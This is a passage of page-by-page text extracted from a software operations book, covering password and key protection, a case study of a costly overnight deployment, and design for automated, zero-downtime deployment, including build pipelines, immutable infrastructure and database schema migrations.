      "content": "Chapter 11. Security • 232\n\nsecured. Sadly, patch management tools don’t know how to deal with contain- ers right now. As a result, a containerized application may still have operating system vulnerabilities that IT patched days or weeks ago.\n\nThe solution is to treat container images as perishable goods. You need an automated build process that creates new images from an upstream base and your local application code. Ideally this comes from your continuous integration pipeline. Be sure to configure timed builds for any application that isn’t still under active development, though.\n\nConfigured Passwords\n\nPasswords are the Brazil nut of application security; every mix has them, but nobody wants to deal with them. There’s obviously no way that somebody can interactively key in passwords every time an application server starts up. Therefore, database passwords and credentials needed to authenticate to other systems must be configured in persistent files somewhere.\n\nAs soon as a password is in a text file, it is vulnerable. Any password that grants access to a database with customer information is worth thousands of dollars to an attacker and could cost the company thousands in bad pub- licity or extortion. These passwords must be protected with the highest level of security achievable.\n\nAt the absolute minimum, passwords to production databases should be kept separate from any other configuration files. They should especially be kept out of the installation directory for the software. (I’ve seen operations zip up the entire installation folder and ship it back to development for analysis, for example, during a support incident.) Files containing passwords should be made readable only to the owner, which should be the application user. If the application is written in a language that can execute privilege separation, then it’s reasonable to have the application read the password files before downgrad- ing its privileges. In that case, the password files can be owned by root.\n\nPassword vaulting keeps passwords in encrypted files, which reduces the security problem to that of securing the single encryption key rather than securing multiple text files. This can assist in securing the passwords, but it is not, by itself, a complete solution. Because it’s easy to inadvertently change or overwrite file permissions, intrusion detection software such as Tripwire should be employed to monitor permissions on those vital files.22\n\n22. www.tripwire.com\n\nreport erratum • discuss",
      "content_length": 2506,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 241,
      "content": "Security as an Ongoing Process • 233\n\nAWS Key Management Service (KMS) is useful here. With KMS, applications use API calls to acquire decryption keys. That way the encrypted data (the database passwords) don’t sit in the same storage as the decryption keys! If you use Vault, then it holds the database credentials directly in the vault.\n\nIn every case, it’s important to expunge the key from memory as soon as possible. If the application keeps the keys or passwords in memory, then memory dumps will also contain them. For UNIX systems, core files are just memory dumps of the application. An attacker that can provoke a core dump can get the passwords. It’s best to disable core dumps on production applica- tions. For Windows systems, the “blue screen of death” indicates a kernel error, with an accompanying memory dump. This dump file can be analyzed with Microsoft kernel debugging tools; and depending on the configuration of the server, it can contain a copy of the entire physical memory of the machine—passwords and all.\n\nSecurity as an Ongoing Process\n\nFrameworks can’t protect you from the Top 10. Neither can a one-time review by your company’s AppSec team. Security is an ongoing activity. It must be part of your system’s architecture: crucial decisions about encrypted commu- nication, encryption at rest, authentication, and authorization are all cross- cutting concerns that affect your entire system.\n\nNew attacks emerge all the time. You must have a process to discover attacks (hopefully before they are used on you) and remediate your system quickly.\n\nThis is doubly true when you deploy technology that hasn’t been battle- hardened. New technology with new APIs will have vulnerabilities. That doesn’t mean you should give up the advantages it offers. It does mean that you need to be vigilant about patching it. Make sure you can redeploy your servers on a moment’s notice.\n\nWrapping Up\n\nApplication security affects life and livelihood. It’s another area where we need to consider both the component-level behavior and the behavior of the system as a whole. Two secure components don’t necessarily mix to make a secure system.\n\nThe most common target of value is user data, especially credit card informa- tion. Even if you don’t handle credit cards, you might not be off the hook. Industrial espionage is real and it can sometimes look as harmless as the location of a shipment of tasty pecans.\n\nreport erratum • discuss",
      "content_length": 2448,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 242,
      "content": "Chapter 11. Security • 234\n\nBeware the pie crust defense. Internal APIs need to be protected with good authentication and authorization. It’s also vital to encrypt data on the wire, even inside an organization. There’s no such thing as a secure perimeter today. Bitter experience shows that breaches can be present for a long time before detection, more than enough for an attacker to devise recipes to get at that sweet user data.\n\nFull treatment of application security is way beyond the scope of this book. The topics covered in this chapter earned their place by sitting in the inter- section of software architecture, operations, and security. Consider this a starting point in a journey. Follow the trail from here into the rich and scary world of CVEs,23 CWEs,24 and CERTs.25\n\nThis finishes our slow zoom out from the physical substrate—copper, silicon, and iron oxide—all the way to systemic considerations. In the next part, we will look at the moment of truth: deployment!\n\n23. http://cve.mitre.org 24. https://cwe.mitre.org/index.html 25. www.cert.org\n\nreport erratum • discuss",
      "content_length": 1088,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 243,
      "content": "Part III\n\nDeliver Your System",
      "content_length": 29,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 244,
      "content": "CHAPTER 12\n\nCase Study: Waiting for Godot\n\nIt isn’t enough to write the code. Nothing is done until it runs in production. Sometimes the path to production is a smooth and open highway. Other times, especially with older systems, it’s a muddy track festooned with potholes, bandits, and checkpoints with border guards. This was one of the bad ones.\n\nI turn my grainy eyes toward the clock on the wall. The hands point to 1:17 a.m. I’d swear time has stopped. It has always been 1:17. I’ve seen enough film noir that I expect a fly to crawl across the face of the clock. There is no fly. Even the flies are asleep now. On the Polycom, someone is reporting status. It’s a DBA. One of the SQL scripts didn’t work right, but he “fixed” it by run- ning it under a different user ID.\n\nThe wall clock doesn’t mean much right now. Our Lamport clock is still stuck a little before midnight. The playbook has a row that says SQL scripts finish at 11:50 p.m. We’re still on the SQL scripts, so logically we’re still at 11:50 p.m. Before dawn, we need our playbook time and solar time to converge in order for this deployment to succeed.\n\nThe first row in the playbook started yesterday afternoon with a round of status reports from each area: dev, QA, content, merchants, order management, and so on. Somewhere on the first page of the playbook we had a go/no-go meeting at 3 p.m. Everyone gave the deployment a go, although QA said that they hadn’t finished testing and might still find a showstopper. After the go/no-go meeting, an email went out to the business stakeholders, announcing that the deployment would go forward. That email is their cue to go home, eat dinner at four in the afternoon, and get some sleep. We need them to get up at 1 a.m. to “smoke test” the new features. That’s our UAT window: 1 to 3 a.m.\n\nIt’s 1:17 and the business stakeholders are awake and waiting to do their thing. I’m waiting to do my thing. When we get to about 12:40 in the playbook\n\nreport erratum • discuss",
      "content_length": 1990,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 245,
      "content": "Chapter 12. Case Study: Waiting for Godot • 238\n\nI run a script. I don’t know how long I’ll have to wait, but somehow I’m sure the clock will still say 1:17. Until then, I watch some numbers on a graph. In a release a couple of years ago, those numbers went the wrong way. So now we watch them. I know the code that triggered the problem was rewritten long ago. Nothing to be done. But the playbook calls for us to monitor those numbers and so we do. The release commander will sometimes ask what those numbers are.\n\nTwo days ago, we started reviewing and updating the playbook. We have a process for updating the process. The release commander walks through the whole thing row by row, and we confirm each row or update them for this particular release. Sometimes there are more steps, sometimes fewer. Different releases affect different features, so we need different people available to debug. Each review meeting takes two or three hours.\n\nAround the long conference table, more than twenty heads are bowed over their laptops. They look like they are praying to the Polycoms: “Please say it worked. Please say it worked.” An equal number of people are dialed in to the same conference bridge from four locations around the world. In total, this release will consume more than forty of us over a 24-hour period. Most of the operations team members are here. The remainder are asleep so that they can be fresh to fix leftover problems in the morning. A while back we had an operator error that we blamed on fatigue. So now there’s a step in the playbook for the “B team” to go home and sleep. I tried to sneak in rows from Sandra Boynton’s Going to Bed Book—\n\n“The day is done, they say goodnight.\n\nAnd somebody turns off the light.”\n\nBut the playbook has no room for whimsy.\n\nOur Lamport clock jumps forward while I’m not looking. The release comman- der tells Sys Ops to update symlinks. That’s my cue: I am Sys Ops. It’s not as cool as saying, “I am Iron Man.” The term “DevOps” won’t exist for another year, and in a different galaxy than this conference room. I tap Enter in my PuTTY window logged in to the jumphost—the only machine the others will accept SSH connections from. My script does three things on each machine. It updates a symbolic link to point to the new code drop, runs the JSP pre- compiler, and starts the server processes. A different script placed the code on the servers hours ago.\n\nNow my turn is done until we finish UAT. Some energy gets generated when a voice emanates from the Polycom, informing us, “It didn’t work.” That may\n\nreport erratum • discuss",
      "content_length": 2587,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 246,
      "content": "Chapter 12. Case Study: Waiting for Godot • 239\n\nbe the least helpful bug report ever received. It turns out the person was testing a page that wasn’t part of this release and had a known bug from two or three years back.\n\nI don’t deal with boredom very well. After some fruitful contemplation on the nature of the buzz produced by fluorescent lights (and that the pitch must be different in countries on 50 hertz power), I start to wonder how much this deployment costs. A little napkin math surprises me enough that I make a spreadsheet. The size of the army times one day. I don’t know the cost structure, but I can guess that $100 per hour per person is not too far off. Add in some lost sales while the site is “gone fishing,” but not a lot because we’re offline during a slow part of the day. It’s about $100,000 to run this deployment. We do this four to six times a year.\n\nYears later, I would witness a deployment at the online retailer Etsy. An investor was visiting, and as a routine part of the visit the company had him push the button to run its “deployinator.” The investor seemed pleased but not impressed. I felt a kind of bubbling hysteria. I needed to grab him by the collar. Didn’t he understand what that meant? How amazing it was? At the same time, I had a deep sense of loss: all that time in the deployment army. All that wasted potential. The wasted humanity! Using people as if they were bots. Disrupting lives, families, sleep patterns...it was all such a waste.\n\nIn the end, our deployment failed UAT. Some feature had passed QA because the data in the QA environment didn’t match production. (Stop me if you’ve heard this one before.) Production had extra content that included some JavaScript to rewrite part of a page from a third party and it didn’t work with the new page structure. The clock on the wall claimed it was around 5 a.m. when we finished the rollback procedure. That afternoon, we started planning the second attempt scheduled for two days hence.\n\nYou may have a deployment army of your own. The longer your production software has existed the more likely it is. In the following chapters, we’ll look at the forces that lead to this antipattern. We’ll also see how to climb out of the pit of despair. As you’ll see, making deployments faster and more routine has an immediate financial benefit. More than that, though, a virtuous cycle kicks in that gives you new superpowers. Best of all, you can stop wasting human potential on jobs that should be scripts.\n\nreport erratum • discuss",
      "content_length": 2530,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 247,
      "content": "CHAPTER 13\n\nDesign for Deployment\n\nIn the last chapter, we were stuck in a living nightmare, one of many endless deployments that waste countless hours and dollars. Now we turn to sweeter dreams as we contemplate automated deployments and even continuous deployments. In this chapter you learn how to design your applications for easy rollout. Along the way, we look at packaging, integration point versioning, and database schemata.\n\nSo Many Machines\n\nGiven the diversity of virtualization and deployment options we have now, words like server, service, and host have gotten muddy. For the rest of this chapter, the word machine will be a simple stand-in for configurable operating system instance. If you’re running on real metal, then it means the physical host. If you’re running a virtual machine, container, or unikernel, then that is the unit. When the distinctions matter, the text will call them out. Service will refer to a callable interface for others to use. A service is always made up of redundant copies of software running on multiple machines.\n\nSo where are we now? We have more ways to run software in production than ever. The net result is that our environments have more machines than ever, mostly virtual. We talk about pets and cattle, but given their ephemeral life- spans, we should call some of them “mayflies.” There are machines that operators never touch because they’re created by other machines. That means yet more configurations to manage and more configuration management tools to aid us. If we accept this complexity, we should certainly get something back out of it in the form of increased uptime during deployments.\n\nreport erratum • discuss",
      "content_length": 1680,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 248,
      "content": "Chapter 13. Design for Deployment • 242\n\nThe Fallacy of Planned Downtime\n\nThroughout this book, our fundamental premise is that version 1.0 is the beginning of the system’s life. That means we shouldn’t plan for one or a few deployments to production, but many upon many. Once upon a time, we wrote our software, zipped it up, and threw it over the wall to operations so they could deploy it. If they were nice, then maybe we would add in some release notes about whatever new configuration options they should set. Operations would schedule some “planned downtime” to execute the release.\n\nI hate the phrase “planned downtime.” Nobody ever clues the users in on the plan. To the users, downtime is downtime. The internal email you sent announcing the downtime doesn’t matter a bit to your users. Releases should be like what Agent K says in Men in Black: “There’s always an Arquillian Battle Cruiser, or Corillian Death Ray, or intergalactic plague, [or a major release to deploy], and the only way users get on with their happy lives is that they do not know about it!”\n\nMost of the time, we design for the state of the system after a release. The trouble is that that assumes the whole system can be changed in some instantaneous quantum jump. It doesn’t work that way. The process of updating the system takes time. A typical design requires that the system always sees itself in either the “before” or “after” state, never “during.” The users get to see the system in the “during” state. Even so, we want to avoid disrupting their experiences. How do we reconcile these perspectives?\n\nWe can pull it off by designing our applications to account for the act of deployment and the time while the release takes place. In other words, we don’t just write for the end state and leave it up to operations to figure out how to get the stuff running in production. We treat deployment as a feature. The remainder of this chapter addresses three key concerns: automation, orchestration, and zero-downtime deployment.\n\nAutomated Deployments\n\nOur goal in this chapter is to learn how we need to design our applications so that they’re easy to deploy. This section describes the deployment tools themselves to give us a baseline for understanding the design forces they impose. This overview won’t be enough for you to pick up Chef and start writing deployment recipes, but it will put Chef and tools like it into context so we know what to do with our ingredients.\n\nreport erratum • discuss",
      "content_length": 2484,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 249,
      "content": "Automated Deployments • 243\n\nThe first tool of interest is the build pipeline. It picks up after someone com- mits a change to version control. (Some teams like to build every commit to master; others require a particular tag to trigger a build.) In some ways, the build pipeline is an overgrown continuous integration (CI) server. (In fact, build pipelines are often implemented with CI servers.) The pipeline spans both development and operations activities. It starts exactly like CI with steps that cover development concerns like unit tests, static code analysis, and compilation. See the figure that follows. Where CI would stop after publishing a test report and an archive, the build pipeline goes on to run a series of steps that culminate in a production deployment. This includes steps to deploy code into a trial environment (either real or virtual, maybe a brand-new virtual environment), run migration scripts, and perform integration tests.\n\nCompile\n\ndeploy\n\nVersionControl\n\nBuildManager\n\nDeveloper\n\ncommit\n\nnotify\n\nAnalyze\n\nrun\n\nArtifacts\n\nBuildLogs\n\nConﬁgMgmt\n\nUnit Test\n\nuse\n\nPackage\n\nDeployTrial\n\nIn SituTest\n\nDeployReal\n\nPublish\n\nlogpost\n\nWe call it a build pipeline, but it’s more like a build funnel. Each stage of a build pipeline is looking for reasons to reject the build. Tests failed? Reject it. Lint complains? Reject it. Build fails integration tests in staging? Reject it. Finished archive smells funny? Reject it.\n\nThis figure lumps steps together for clarity. In a real pipeline, you’ll probably have a larger number of smaller steps. For example, “deploy trial” will usually encompass the preparation, rollout, and cleanup phases that we’ll see later in this chapter.\n\nThere are some popular products for making build pipelines. Jenkins is probably the most commonly used today.1 I also like Thoughtworks’ GoCD.2 A number of new tools are vying for this space, including Netflix’s Spinnaker\n\n1. 2.\n\nhttps://jenkins.io\n\nwww.thoughtworks.com/go\n\nreport erratum • discuss",
      "content_length": 2001,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 250,
      "content": "Chapter 13. Design for Deployment • 244\n\nand Amazon’s AWS Code Pipeline.3,4 And you always have the option to roll your own out-of-shell scripts and post-commit hooks. My advice is to dodge the analysis trap. Don’t try to find the best tool, but instead pick one that suffices and get good with it.\n\nAt the tail end of the build pipeline, we see the build server interacting with one of the configuration management tools that we first saw in Chapter 8, Processes on Machines, on page 155. A plethora of open-source and commercial tools aim at deployments. They all share some attributes. For one thing, you declare your desired configuration in some description that the tool understands. These descriptions live in text files so they can be version-controlled. Instead of describing the specific actions to take, as a shell script would, these files describe a desired end state for the machine or service. The tool’s job is to figure out what actions are needed to make the machine match that end state.\n\nConfiguration management also means mapping a specific configuration onto a host or virtual machine. This mapping can be done manually by an operator or automatically by the system itself. With manual assignment, the operator tells the tool what each host or virtual machine must do. The tool then lays down the configurations for that role on that host. Refer to the figure that follows.\n\n“web”\n\nServer 3\n\nServer 2\n\nServer 1\n\nA\n\nB\n\nAdmin\n\napply\n\n“app”\n\n“web”\n\nC\n\napply\n\nAutomatic role assignment means that the operator doesn’t pick roles for specific machines. Instead, the operator supplies a configuration that says, “Service X should be running with Y replicas across these locations.” This style goes hand-in-hand with a platform-as-a-service infrastructure, as shown in the figure on page 245. It must then deliver on that promise by running the correct number of instances of the service, but the operator doesn’t care which\n\n3. 4.\n\nwww.spinnaker.io\n\nhttps://aws.amazon.com/codepipeline\n\nreport erratum • discuss",
      "content_length": 2028,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 251,
      "content": "Automated Deployments • 245\n\nHost 3\n\nHost 2\n\nPaaSController\n\nAdmin\n\nI need2 “web”1 “app”\n\nrun “app” VM\n\nrun “web” VM\n\nHost 1\n\nrun “web”VM\n\nmachines handle which services. The platform combines the requested capacity with constraints. It finds hosts with enough CPU, RAM, and disk, but avoids co-locating instances on hosts. Because the services can be running on any number of different machines with different IP addresses, the platform must also configure the network for load balancing and traffic routing.\n\nAlong with role mapping, there are also different strategies for packaging and delivering the machines. One approach does all the installation after booting up a minimal image. A set of reusable, parameterizable scripts installs OS packages, creates users, makes directories, and writes files from templates. These scripts also install the designated application build. In this case, the scripts are a deliverable and the packaged application is a deliverable.\n\nThis “convergence” approach says the deployment tool must examine the current state of the machine and make a plan to match the desired state you declared. That plan can involve almost anything: copying files, substituting values into templates, creating users, tweaking the network settings, and more. Every tool also has a way to specify dependencies among the different steps. It is the tool’s job to run the steps in the right order. Directories must exist before copying files. User accounts must be created before files can be owned by them, and so on.\n\nUnder the immutable infrastructure approach that we first encountered in Immutable and Disposable Infrastructure, on page 158, the unit of packaging is a virtual machine or container image. This is fully built by the build pipeline and registered with the platform. If the image requires any extra configuration, it must be injected by the environment at startup time. For example, Amazon Machine Images (AMIs) are packaged as virtual machines. A machine instance created from an AMI can interrogate its environment to find out the “user data” supplied at launch time.\n\nreport erratum • discuss",
      "content_length": 2127,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 252,
      "content": "Chapter 13. Design for Deployment • 246\n\nPeople in the immutable infrastructure camp will argue that convergence never works. Suppose a machine has been around a while, a survivor of many deployments. Some resources may be in a state the configuration management tool just doesn’t know how to repair. There’s no way to get from the current state to the desired state. Another, more subtle issue is that parts of the machine state aren’t even included in your configuration recipes. These will be left untouched by the tool, but might be radically different than you expect. Think about things like kernel parameters and TCP timeouts.\n\nUnder immutable infrastructure, you always start with a basic OS image. Instead of trying to converge from an unknown state to the desired state, you always start from a known state: the master OS image. This should succeed every time. If not, at least testing and debugging the recipes is straightforward because you only have to account for one initial state rather than the stucco- like appearance of a long-lived machine. When changes are needed, you update the automation scripts and build a new machine. Then the outdated machine can simply be deleted.\n\nNot surprisingly, immutable infrastructure is closely aligned with infrastruc- ture-as-a-service (IaaS), platform-as-a-service (PaaS), and automatic mapping. Convergence is more common in physical deployments and on long-lived vir- tual machines and manual mapping. In other words, immutable infrastructure is for cattle, convergence is for pets.\n\nContinuous Deployment\n\nBetween the time a developer commits code to the repository and the time it runs in production, code is a pure liability. Undeployed code is unfinished inventory. It has unknown bugs. It may break scaling or cause production downtime. It might be a great implementation of a feature nobody wants. Until you push it to production, you can’t be sure. The idea of continuous deployment is to reduce that delay as much as possible to minimize the lia- bility of undeployed code.\n\nA vicious cycle is at play between deployment size and risk, too. Look at the figure on page 247. As the time from check-in to production increases, more changes accumulate in the deployment. A bigger deployment with more change is definitely riskier. When those risks materialize, the most natural reaction is to add review steps as a way to mitigate future risks. But that will lengthen the commit-production delay, which increases risk even further!\n\nThere’s only one way to break out of this cycle: internalize the motto, “If it hurts, do it more often.” In the limit, that statement means, “Do everything\n\nreport erratum • discuss",
      "content_length": 2677,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 253,
      "content": "Continuous Deployment • 247\n\nLonger delaybetweendeployments\n\nMore changesin each deployment\n\nHigher riskof bugs and downtime\n\nReview processes\n\ncontinuously.” For deployments, it means run the full build pipeline on every commit.\n\nA place where we see variations is at the very final stages of the build pipeline. Some teams trigger the final production deployment automatically. Others have a “pause” stage, where some human must provide positive affirmation that “yes, this build is good.” (Worded another way, it says, “Yes, you may fire me if this fails.”) Either approach is valid, and the one you choose depends greatly on your organization’s context: if the cost of moving slower exceeds the cost of an error in deployment, then you’ll lean toward automatic deployment to production. On the other hand, in a safety-critical or highly regulated environment, the cost of an error may be much larger than the cost of moving slowly relative to the competition. In that case, you’ll lean toward a human check before hitting production. You just need to be sure that an authorized button-pusher is available whenever a change needs to happen, even if that’s an emergency code change at 2 a.m.\n\nNow that we have a better understanding of what a build pipeline covers, let’s look at the phases of a deployment.\n\nreport erratum • discuss",
      "content_length": 1335,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 254,
      "content": "Chapter 13. Design for Deployment • 248\n\nPhases of Deployment\n\nIt’s no surprise that continuous deployment first arose in companies that use PHP. A deployment in a PHP application can be as simple as copying some files onto a production host. The very next request to that host picks up the new files. The only thing to worry about is a request that comes in while the file is only partially copied.\n\nNear the other end of the spectrum, think about a five-million-line Java application, built into one big EAR file. Or a C# application with a couple hundred assemblies. These applications will take a long time to copy onto the target machine and then a large runtime process to restart. They’ll often have in-memory caches and database connection pools to initialize.\n\nWe can fill in the middle part of the spectrum as shown in this diagram. Go further to the right, and the degree of packaging increases. At the extreme end of the spectrum, we have applications that are deployed as whole virtual machine images.\n\nArchivesFilesWhole Machines\n\nStatic SitesPHPCGI Scripts\n\n.rpm.deb.msi\n\n.ear.war.exe\n\n.jar.dllgem\n\nAMIContainerVMDK\n\nSingle files with no runtime process will always be faster than copying archive files and restarting application containers. In turn, those will always be faster than copying gigabyte-sized virtual machine images and booting an operating system.\n\nWe can relate that grain size to the time needed to update a single machine. The larger the grain, the longer it takes to apply and activate. We must account for this when rolling a deployment out to many machines. It’s no good to plan a rolling deployment over a 30-minute window only to discover that every machine needs 60 minutes to restart!\n\nAs we roll out a new version, both the macroscopic and microscopic time scales come into play. The microscopic time scale applies to a single instance (host, virtual machine, or container). The macroscopic scale applies to the whole rollout. This nesting gives us the structure shown here: one large-scale process with many individual processes nested inside (see the diagram on page 249).\n\nreport erratum • discuss",
      "content_length": 2141,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 255,
      "content": "Phases of Deployment • 249\n\nDeployment\n\nRollout\n\nPrep\n\nCleanup\n\nInstance Update\n\nUpdate\n\nDrain\n\nStartup\n\nPrepOld VersionNew version\n\nAt the microscopic level, it’s important to understand four time spans. First, how long does it take to prepare for the switchover? For mutable infrastruc- ture, this is copying files into place so you can quickly update a symbolic link or directory reference. For immutable infrastructure, this is the time needed to deploy a new image.\n\nSecond, how long does it take to drain activity after you stop accepting new requests? This may be just a second or two for a stateless microservice. For something like a front-end server with sticky session attachment, it could be a long time—your session timeout plus your maximum session duration. Bear in mind you may not have an upper bound on how long a session can stay active, especially if you can’t distinguish bots and crawlers from humans! Any blocked threads in your application will also block up the drain. Those stuck requests will look like valuable work but definitely are not. Either way, you can watch the load until enough has drained that you’re comfortable killing the process or you can pick a “good enough” time limit. The larger your scale, the more likely you’ll just want the time limit to make the whole process more predictable.\n\nThird, how long does it take to apply the changes? If all it takes is a symlink update, this can be very quick. For disposable infrastructure, there’s no “apply the change”; it’s about bringing up a new instance on the new version. In that case, this time span overlaps the “drain” period. On the other hand, if your deployment requires you to manually copy archives or edit configuration files, this can take a while. But, hey, at least it’ll also be more error-prone!\n\nFinally, once you start the new release on a particular machine, how long is it before that instance is ready to receive load? This is more than just your runtime’s startup time. Many applications aren’t ready to handle load until they have loaded caches, warmed up the JIT, established database connec- tions, and so on. Send load to a machine that isn’t open for business yet, and you’ll either see server errors or very long response times for those requests unlucky enough to be the first ones through the door.\n\nreport erratum • discuss",
      "content_length": 2344,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 256,
      "content": "Chapter 13. Design for Deployment • 250\n\nThe macroscopic time frame wraps around all the microscopic ones, plus some preparatory and cleanup work. Preparation involves all the things you can do without disturbing the current version of the application. During this time the old version is still running everywhere, but it’s safe to push out new content and assets (as long as they have new paths or URLs).\n\nOnce we think about a deployment as a span of time, we can enlist the application to help with its own deployment. That way, the application can smooth over the things that normally cause us to take downtime for deploy- ments: schema changes and protocol versions.\n\nRelational Database Schemata\n\nDatabase changes are one of the driving factors behind “planned downtime,” especially schema changes to relational databases. With some thought and preparation, we can eliminate the need for dramatic, discontinuous, downtime- inducing changes.\n\nYou probably have a migrations framework in place already. If not, that’s definitely the place to start. Instead of running raw SQL scripts against an admin CLI, you should have programmatic control to roll your schema version forward. (It’s good for testing to roll it backward as well as forward, too.)\n\nBut while a migrations framework like Liquibase helps apply changes to the schema, it doesn’t automatically make those changes forward- and back- ward-compatible. That’s when we have to break up the schema changes into expansion and cleanup phases.\n\nSome schema changes are totally safe to apply before rolling out the code:\n\nAdd a table. • Add views. • Add a nullable column to a table. • Add aliases or synonyms. • Add new stored procedures. • Add triggers. • Copy existing data into new tables or columns.\n\nAll of these involve adding things, so I refer to this as the expansion phase of schema changes. (We’ll look at cleanup a bit later.) The main criterion is that nothing here will be used by the current application. This is the reason for caution with database triggers. As long as those triggers are nonconditional and cannot throw an error, then it’s safe to add them.\n\nreport erratum • discuss",
      "content_length": 2159,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 257,
      "content": "Phases of Deployment • 251\n\nWe don’t see triggers very often in modern application architecture. The main reason I bring them up is because they allow us to create “shims.” In carpen- try, a shim is a thin piece of wood that fills a gap where two structures meet. In deployments, a shim is a bit of code that helps join the old and new versions of the application. For instance, suppose you have decided to split a table. As shown in the figure that follows, in the preparation phase, you add the new table. Once the rollout begins, some instances will be reading and writing the new table. Others will still be using the old table. This means it’s possible for an instance to write data into the old table just before it’s shut down. Whatever you copied into the new table during preparation won’t include that new entity, so it gets lost.\n\nTable A\n\nTable A\n\nAttr 1\n\nAttr 2\n\nAttr 3\n\nAttr 4\n\nID\n\nAttr 2\n\nID\n\nAttr 3\n\nAttr 4\n\nID\n\nTable B\n\nafter insert\n\nAttr 1\n\nShims help solve this by bridging between the old and new structures. For instance, an INSERT trigger on the old table can extract the proper fields and also insert them into the new table. Similarly, an UPDATE trigger on the new table can issue an update to the old table as well. You typically need shims to handle insert, update, and delete in both directions. Just be careful not to create an infinite loop, where inserting into the old table triggers an insert into the new table, which triggers an insert into the old table, and so on.\n\nHalf a dozen shims for each change seems like a lot of work. It is. That’s the price of batching up changes into a release. Later in this chapter, when we talk about the “trickle-then-batch” migration strategy, we’ll see how you can accomplish the same job with less effort by doing more, smaller releases.\n\nDon’t forget to test them on a realistic sample of data, either. I’ve seen a lot of migrations fail in production because the test environment only had nice, polite, QA-friendly data. Forget that. You need to test on all the weird data. The stuff that’s been around for years. The data that has survived years of\n\nreport erratum • discuss",
      "content_length": 2148,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 258,
      "content": "Chapter 13. Design for Deployment • 252\n\nDBA actions, schema changes, and application changes. Absolutely do not rely on what the application currently says is legal! Sure, every new user has to pick three security questions about pets, cars, and sports teams. But you still have some user records from the days before you adopted those questions. There’ll be people who haven’t logged in for a decade and have a bunch of NULLs for fields you require now. In other words, there’ll be data that abso- lutely cannot be produced by your application as it exists today. That’s why you must test on copies of real production data.\n\nThat’s all well and good for the stodgy old relational databases (twentieth- century technology!). What about the shiny post-SQL databases?\n\nSchemaless Databases\n\nIf you’re using something other than a relational database, then you’re done. There’s absolutely no work you need to do for deployments.\n\nJust kidding!\n\nA schemaless database is only schemaless as far as the database engine cares. Your application is another story entirely. It expects certain structure in the documents, values, or graph nodes returned by your database. Will all the old documents work on the new version of your application? I mean all the old documents, way back to the very first customer record you ever created. Chances are your application has evolved over time, and old versions of those documents might not even be readable now. Harder still, your database may have a patchwork of documents, all created using different application versions, with some that have been loaded, updated, and stored at different points in time. Some of those documents will have turned into time bombs. If you try to read one today, your application will raise an exception and fail to load it. Whatever that document used to be, it effectively no longer exists.\n\nThere are three ways to deal with this. First, write your application so it can read any version ever created. With each new document version, add a new stage to the tail end of a “translation pipeline” like the one shown in the figure on page 253.\n\nIn this example, the top-level reader has detected a document written in ver- sion 2 of the document schema. It needs to be brought up-to-date, which is why the version 2 reader is configured to inject the document into the pipeline via the “version 2 to version 3 translator.” Each translator feeds into the next until the document is completely current. One wrinkle: If the document format has been split at some point in the past, then the pipeline must split as well,\n\nreport erratum • discuss",
      "content_length": 2606,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 259,
      "content": "Phases of Deployment • 253\n\nTranslation Pipeline\n\nV1Reader\n\nV2 Translator\n\nV2Reader\n\nV3 Translator\n\nV3Reader\n\nV4 Translator\n\nVn-1 Reader\n\nVn Translator\n\nVnReader\n\nReader\n\ndetect versionand dispatch\n\nCurrentDoc\n\nas shown in the figure that follows. It must either produce multiple documents in response to the caller, or it must write all the documents back to the database and then reissue the read. The second read will detect the current version and need zero translations.\n\nDoc BV2 Translator\n\nDoc AV1Reader\n\nDoc A V2 Translator\n\nDoc AV2Reader\n\nDoc A V3 Translator\n\nDoc AV3Reader\n\nDoc A V4 Translator\n\nDoc AVn-1 Reader\n\nDoc A Vn Translator\n\nDoc AVnReader\n\nDoc A Reader\n\nCurrentDoc A\n\ndetect versionand dispatch\n\nCurrentDoc\n\nreport erratum • discuss",
      "content_length": 751,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 260,
      "content": "Chapter 13. Design for Deployment • 254\n\nIf this sounds like a lot of work, it is. All the version permutations must be covered by tests, which means keeping old documents around as seed data for tests. Also, there’s the problem of linearly increasing translation time as the pipeline gets deep.\n\nThe second approach is to write a migration routine that you run across your entire database during deployment. That will work well in the early stages, while your data is still small. Later on, though, that migration will take many minutes to hours. There’s no way you want to take a couple of hours of downtime to let the migration finish. Instead, the application must be able to read the new document version and the old version.\n\nIf both the rollout and the data migration ran concurrently, then four scenarios could occur:\n\n1. An old instance reads an old document. No problem.\n\n2. A new instance reads an old document. No problem.\n\n3. A new instance reads a new document. No problem.\n\n4. An old instance reads a new document. Uh-oh. Big problem.\n\nFor this reason, it would be best to roll out the application version before running the data migration.\n\nThe third major approach is the one I like best. I call it “trickle, then batch.” In this strategy, we don’t apply one massive migration to all documents. Rather, we add some conditional code in the new version that migrates docu- ments as they are touched, as shown in the figure on page 255. This adds a bit of latency to each request, so it basically amortizes the batched migration time across many requests.\n\nWhat about the documents that don’t get touched for a long time? That’s where the batch part comes in. After this has run in production for a while, you’ll find that the most active documents are updated. Now you can run a batch migration on the remainder. It’s safe to run concurrently with produc- tion, because no old instances are around. (After all, the deployment finished days or weeks ago.) Once the batch migration is done, you can even push a new deployment that removes the conditional check for the old version.\n\nThis approach delivers the best of both worlds. It allows rapid rollout of the new application version, without downtime for data migration. It takes advantage of our ability to deploy code without disruption so that we can remove the migration test once it’s no longer needed. The main restriction is that you really shouldn’t have two different, overlapping trickle migrations\n\nreport erratum • discuss",
      "content_length": 2500,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 261,
